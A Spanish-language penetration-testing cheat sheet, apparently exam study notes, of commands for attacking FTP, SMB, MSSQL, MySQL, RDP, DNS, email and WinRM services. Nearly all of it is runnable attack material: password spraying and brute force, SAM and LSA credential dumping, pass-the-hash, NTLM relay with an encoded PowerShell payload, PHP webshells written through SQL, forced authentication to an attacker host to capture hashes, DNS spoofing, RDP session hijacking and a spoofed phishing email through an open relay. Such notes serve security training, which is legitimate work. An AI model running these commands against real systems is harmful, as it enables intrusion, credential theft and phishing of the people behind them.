---
title: "Attacking Common Services"
description: "FTP, SMB, SQL, RDP, WinRM, DNS y email — ataques a servicios típicos."
sidebar:
  order: 1
  label: "Attacking Common Services"
---
> Enumeración y explotación de servicios de red comunes: FTP, SMB, SQL, RDP, DNS, email y WinRM. Misconfigs, credenciales débiles y RCE sin autenticación.

---


## FTP — Puerto 21

```bash
# Scan FTP con scripts NSE
sudo nmap -sV -p21 -sC --script=ftp-brute <IP>

# Acceso anónimo
ftp <IP>        # usuario: anonymous / anonymous
ftp> ls -la
ftp> get <file>
ftp> put <file>

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 15
medusa -u admin -P passwords.txt -h <IP> -M ftp

# FTP bounce attack (obsoleto pero aún útil)
nmap -b <ftp-proxy-ip> <target-ip>
```

| Estado | Descripción |
|--------|-------------|
| 220 | Servicio listo |
| 230 | Login exitoso |
| 331 | Usuario OK, espera contraseña |
| 530 | Login incorrecto |

---

## SMB — Puerto 445

### Enumeración

```bash
# Listar shares (null session)
smbclient -N -L //<IP>
smbclient //<IP>/share -N                      # acceso sin creds

# smbmap — permisos por share
smbmap -H <IP>                                 # listar shares
smbmap -H <IP> -r <share>                     # listar contenido
smbmap -H <IP> --download '<share>\file.txt'
smbmap -H <IP> --upload exploit.exe '<share>\exploit.exe'

# rpcclient — enumeración RPC
rpcclient -U'%' <IP>                           # null session
rpcclient> enumdomusers                        # usuarios del dominio
rpcclient> enumdomgroups
rpcclient> queryuser <RID>

# enum4linux-ng — todo en uno
enum4linux-ng -A <IP>                          # full enum
enum4linux-ng -A -C <IP>                       # con crackmapexec

# nmap scripts SMB
nmap -v -p445 --script=smb-vuln-ms17-010 <IP>
nmap -v -p445 --script smb-enum-shares,smb-enum-users <IP>
```

### Ataques — Misconfiguración y RCE

```bash
# Password spray
crackmapexec smb <IP> -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb <IP>/24 -u administrator -p 'Password123'

# RCE vía psexec (requiere admin)
impacket-psexec administrator:'Password123'@<IP>
impacket-smbexec administrator:'Password123'@<IP>
impacket-atexec administrator:'Password123'@<IP> "whoami"

# Ejecutar comando directo
crackmapexec smb <IP> -u administrator -p 'Password123' -x 'whoami'

# Dump SAM/creds
crackmapexec smb <IP> -u administrator -p 'Password123' --sam
crackmapexec smb <IP> -u administrator -H <NT_hash> --lsa

# PtH via SMB
crackmapexec smb <IP> -u administrator -H <NT_hash>
impacket-psexec administrator@<IP> -hashes :<NT_hash>
```

### SMB — Captura y Relay de Hashes

```bash
# Capturar NetNTLMv2 con Responder
sudo responder -I tun0 -wdv
# → después crackear: hashcat -m 5600 hashes.txt rockyou.txt

# NTLM Relay (sin SMB signing)
# Prerequisito: SMB signing desactivado en el target
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> \
  -c 'powershell -enc <BASE64_PAYLOAD>'

# Verificar SMB signing
crackmapexec smb <IP>/24 --gen-relay-list relay_targets.txt
nmap -v --script smb2-security-mode -p445 <IP>/24
```

> **CVE-2020-0796 SMBGhost:** Integer overflow en SMBv3.1.1 compression → RCE en Windows 10 1903/1909 sin autenticación. Buscar con nmap `--script smb-vuln-ms17-010` (similar script approach).

---

## MSSQL — Puerto 1433

### Conexión y Enumeración

```bash
# Conexión
mssqlclient.py <user>:<pass>@<IP>               # impacket
mssqlclient.py <domain>/<user>:<pass>@<IP> -windows-auth
sqsh -S <IP> -U <user> -P <pass> -D <database>
sqlcmd -S <IP> -U SA -P 'Password!' -Q "SELECT name FROM sys.databases"

# Enumeración de bases de datos
SQL> SELECT name FROM master.dbo.sysdatabases    # listar DBs
SQL> USE <database>
SQL> SELECT table_name FROM information_schema.tables WHERE table_type='base table'
SQL> SELECT * FROM users
```

### RCE vía xp_cmdshell

```sql
-- Habilitar xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Ejecutar comandos OS
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
-- Reverse shell: descargar nc.exe y conectar de vuelta
```

### Operaciones de Archivos

```sql
-- Escribir archivo (requiere Ole Automation Procedures)
EXECUTE sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT,
  'C:\inetpub\wwwroot\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', NULL, '<?php echo system($_GET["cmd"]); ?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;

-- Leer archivo
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```

### Capturar Hash del Servidor MSSQL

```bash
# En el atacante: levantar servidor SMB
sudo responder -I tun0 -wdv
# o: sudo impacket-smbserver share ./ -smb2support

# En MSSQL: forzar conexión SMB al atacante
SQL> EXEC master..xp_dirtree '\\<LHOST>\share\'
SQL> EXEC master..xp_subdirs '\\<LHOST>\share\'

# → captura hash NetNTLMv2 del usuario del servicio SQL
# → crackear: hashcat -m 5600 hash.txt rockyou.txt
```

### Impersonation y Linked Servers

```sql
-- Verificar quién se puede impersonar
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
WHERE a.permission_name='IMPERSONATE';

-- Impersonar login
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  -- verificar quién somos
REVERT;              -- volver al usuario original

-- Linked servers
SELECT srvname, isremote FROM sysservers;
EXECUTE('SELECT @@version') AT [<LINKED_SERVER_NAME>];
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [<LINKED_SERVER_NAME>];
```

---

## MySQL — Puerto 3306

```bash
# Conexión
mysql -u root -p<password> -h <IP>
mysql -u root -h <IP> --password='password'

# Enumeración básica
mysql> SHOW DATABASES;
mysql> USE <database>;
mysql> SHOW TABLES;
mysql> SELECT * FROM users;

# Escribir webshell (requiere FILE privilege y path escribible)
mysql> SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/webshell.php';

# Leer archivos del servidor
mysql> SELECT LOAD_FILE("/etc/passwd");

# Verificar privilegios
mysql> SHOW GRANTS FOR CURRENT_USER();
mysql> SELECT user, authentication_string FROM mysql.user;    -- requiere root
```

> **Tip examen:** `INTO OUTFILE` requiere `FILE` privilege y que el directorio sea escribible por el usuario mysql. Rutas frecuentes: `/var/www/html/`, `/srv/http/`.

---

## RDP — Puerto 3389

### Enumeración y Brute Force

```bash
# Verificar si RDP está activo
nmap -sV -p3389 <IP> --script rdp-enum-encryption

# Password spray
crowbar -b rdp -s <IP>/32 -U users.txt -c 'Password123'
hydra -L users.txt -P passwords.txt rdp://<IP> -t 4 -V

# Acceso
rdesktop -u <user> -p <pass> <IP>
xfreerdp /v:<IP> /u:<user> /p:<pass> /dynamic-resolution
```

### PtH via RDP

```bash
# Requiere: DisableRestrictedAdmin = 0 (habilitar en el target)
# Desde una shell con privilegios en el target:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Conectar con hash NT
xfreerdp /v:<IP> /u:administrator /pth:<NT_hash>
```

### Session Hijacking (requiere SYSTEM)

```powershell
# Listar sesiones activas
query user

# Hijack de sesión sin contraseña (SYSTEM required)
sc.exe create sessionhijack binpath="cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
sc.exe start sessionhijack

# Alternativa: tscon directo desde SYSTEM shell
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
```

> **CVE-2019-0708 BlueKeep:** Use-after-free en pre-auth de RDP → RCE sin autenticación en Windows XP/7/Server 2008. Verificar con `nmap --script rdp-vuln-ms12-020`.

---

## DNS — Puerto 53

### Enumeración y Zone Transfer

```bash
# Zone transfer (AXFR) — jackpot si no está protegido
dig AXFR inlanefreight.htb @<DNS_SERVER_IP>

# Enumerar servidores DNS
dig NS inlanefreight.htb @<IP>
host -t NS inlanefreight.htb

# Enumerar registros MX
dig mx inlanefreight.htb | grep "MX" | grep -v ";"
host -t MX inlanefreight.htb

# Brute force de subdominios
fierce --domain inlanefreight.com --dns-servers <IP>

# Subfinder — enumeración pasiva vía OSINT
./subfinder -d inlanefreight.com -v

# Subbrute — para redes internas sin internet
echo "ns1.inlanefreight.com" > resolvers.txt
./subbrute.py inlanefreight.com -s names.txt -r resolvers.txt

# Verificar CNAME para subdomain takeover
host support.inlanefreight.com
nslookup support.inlanefreight.com
# Si responde "NoSuchBucket" o similar → posible subdomain takeover
```

### DNS Spoofing — Red Local

```bash
# Ettercap dns_spoof
# 1. Editar /etc/ettercap/etter.dns
echo 'inlanefreight.com   A   <ATTACKER_IP>' >> /etc/ettercap/etter.dns
echo '*.inlanefreight.com A   <ATTACKER_IP>' >> /etc/ettercap/etter.dns

# 2. Ettercap → Hosts → Scan → añadir target y gateway
# 3. Plugins → dns_spoof → activar
# 4. Usuarios que resuelvan inlanefreight.com → redirigidos al atacante

# Bettercap
sudo bettercap -iface tun0
> set dns.spoof.domains inlanefreight.com
> set dns.spoof.address <ATTACKER_IP>
> dns.spoof on
```

**Subdomain Takeover checklist:**
```
1. subfinder -d <domain>   → listar subdominios
2. host <subdomain>        → buscar CNAME a servicio externo
3. Visitar URL             → error "NoSuchBucket", "404 not found", etc.
4. can-i-take-over-xyz     → verificar si el servicio es vulnerable
5. Registrar dominio expirado → controlar el subdominio
```

---

## Email — SMTP/POP3/IMAP4

### Puertos y Conexión

| Puerto | Servicio | Cifrado |
|--------|---------|---------|
| 25 | SMTP | No |
| 465 | SMTP | SSL |
| 587 | SMTP | STARTTLS |
| 110 | POP3 | No |
| 995 | POP3 | SSL |
| 143 | IMAP4 | No |
| 993 | IMAP4 | SSL |

```bash
# Scan completo de puertos de email
sudo nmap -Pn -sV -sC -p25,110,143,465,587,993,995 <IP>

# Telnet SMTP (identificar versión, comandos disponibles)
telnet <IP> 25
EHLO inlanefreight.htb      # listar extensiones soportadas
```

### Enumeración de Usuarios

```bash
# Via telnet manual
# VRFY — verificar si usuario existe
VRFY root
# 252 = existe | 550 = no existe

# EXPN — expandir lista de distribución
EXPN support-team

# RCPT TO — verificar destinatario
MAIL FROM:test@htb.com
RCPT TO:julio           # 250 = existe | 550 = no existe

# POP3 — USER command
telnet <IP> 110
USER julio              # +OK = existe | -ERR = no existe

# smtp-user-enum — automatizado
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t <IP>
smtp-user-enum -M VRFY -U userlist.txt -t <IP>
smtp-user-enum -M EXPN -U userlist.txt -D inlanefreight.htb -t <IP>
```

### Brute Force — Email Services

```bash
# Hydra — POP3/IMAP4
hydra -L users.txt -p 'Company01!' -f <IP> pop3
hydra -L users.txt -P passwords.txt <IP> imap

# O365 — validar dominio, enumerar usuarios, spray
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' \
  --count 1 --lockout 1 --domain msplaintext.xyz

# MailSniper — O365 / Exchange
Invoke-PasswordSprayOWA -ExchHostname <IP> -UserList users.txt -Password 'Pass123'

# CredKing — Gmail/Okta (tool externo)
```

### Open Relay — Phishing via SMTP

```bash
# Detectar open relay con nmap
nmap -p25 -Pn --script smtp-open-relay <IP>
# "Server is an open relay (14/16 tests)" → vulnerable

# Enviar email spoofado via open relay
swaks --from notifications@inlanefreight.com \
  --to employees@inlanefreight.com \
  --header 'Subject: Urgent - Action Required' \
  --body 'Click here: http://<PHISHING_LINK>/' \
  --server <IP>
```

> **CVE-2020-7247 OpenSMTPD:** RCE sin auth en OpenSMTPD ≤ 6.6.2. Inyección vía campo FROM con semicolon (`;`). Límite de 64 caracteres por comando. Afecta Debian, Fedora, FreeBSD.

---

## WinRM — Puerto 5985/5986

```bash
# Verificar WinRM activo
nmap -sV -p5985,5986 <IP>

# evil-winrm — shell interactiva
evil-winrm -i <IP> -u <user> -p '<password>'
evil-winrm -i <IP> -u <user> -H <NT_hash>           # PtH

# NetExec / CrackMapExec
netexec winrm <IP> -u <user> -p '<password>'
netexec winrm <IP> -u users.txt -p passwords.txt     # spray
netexec winrm <IP> -u <user> -H <NT_hash>            # PtH
netexec winrm <IP>/24 -u administrator -p 'Pass123'  # rango

# PowerShell remoting (desde Windows)
$session = New-PSSession -ComputerName <IP> -Credential (Get-Credential)
Enter-PSSession $session
Invoke-Command -ComputerName <IP> -Credential $cred -ScriptBlock { whoami }
```

---

## Flujo de Ataque — Por Servicio

```
FTP:
  1. anonymous login → buscar archivos sensibles (configs, creds)
  2. Si no → hydra brute force
  3. Si tiene acceso de escritura → subir webshell (si hay web server)

SMB:
  1. null session enum (smbclient -N, enum4linux-ng)
  2. Identificar shares + permisos → buscar creds en archivos
  3. spray → psexec/smbexec si admin
  4. Si no admin → Responder + relay (si signing off)

MSSQL:
  1. mssqlclient.py con creds o SA sin pass
  2. xp_cmdshell → RCE como SQL service account
  3. Si no hay xp_cmdshell → impersonation → linked servers
  4. xp_dirtree → capturar hash NetNTLMv2

RDP:
  1. crowbar/hydra spray contra usuarios conocidos
  2. xfreerdp /pth si tenemos hash NT + DisableRestrictedAdmin=0
  3. Si tenemos shell SYSTEM → session hijacking (tscon)

DNS:
  1. dig AXFR → zona completa si vulnerable
  2. fierce/subfinder → subdominios
  3. host CNAME → ¿apunta a servicio expirado? → takeover

SMTP:
  1. smtp-user-enum → identificar usuarios válidos
  2. hydra/o365spray → brute force / spray
  3. open relay → swaks para phishing interno
```

---

## Pitfalls / Gotchas

- **SMB signing habilitado** → ntlmrelayx no funciona. Verificar primero con `crackmapexec smb --gen-relay-list`.
- **xp_cmdshell desactivado** → habilitarlo requiere `sysadmin` role. Si no somos sysadmin, intentar impersonation primero.
- **MSSQL hash capture** → el hash capturado es del usuario del servicio SQL (ej. `MSSQL$SQL2019`), no necesariamente del admin.
- **AXFR bloqueado en producción** → es la norma. Pasar directamente a brute force con subfinder/dnsenum.
- **Subdomain takeover** → confirmar siempre con `can-i-take-over-xyz` antes de registrar. Algunos servicios requieren verificación.
- **smtp-user-enum lento** → usar `-w 1` para timeout más corto en redes lentas.
- **O365 enumeration detectado** → o365spray puede ser detectado. Reducir rate (`--rate 5`).
- **RDP spray lockout** → el umbral de lockout suele ser 3-5 intentos. Usar `--continue-on-success` y rotación lenta.
- **evil-winrm sin WinRM activo** → verificar con `Test-WSMan <IP>` desde PowerShell primero.
- **MySQL OUTFILE permisos** → el proceso mysql no siempre tiene write access en `/var/www/html/`. Probar con `SHOW VARIABLES LIKE 'secure_file_priv'` para ver restricciones.
- **Open relay en cloud** → los proveedores cloud (AWS SES, SendGrid) bloquean relay por defecto. Solo aplica a servidores on-prem mal configurados.

---

## Cheatsheets relacionados

- [Footprinting](/metodologias/recon/footprinting/) — Enumeración profunda de cada servicio (FTP, SMB, SMTP, DNS)
- [Password Attacks](/metodologias/exploitation/password-attacks/) — Hashcat para crackear NetNTLMv2, PtH, spray patterns
- [Network Enumeration with Nmap](/metodologias/recon/network-enumeration-nmap/) — Port scan previo para identificar servicios
- [Active Directory Enumeration & Attacks](/metodologias/active-directory/active-directory-enumeration-attacks/) — Relay + AD privilege escalation
- [Pivoting, Tunneling, and Port Forwarding](/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — Acceder a servicios internos desde pivots
- [SQL Injection Fundamentals](/metodologias/web/sql-injection-fundamentals/) — Ataques SQL adicionales desde la app web
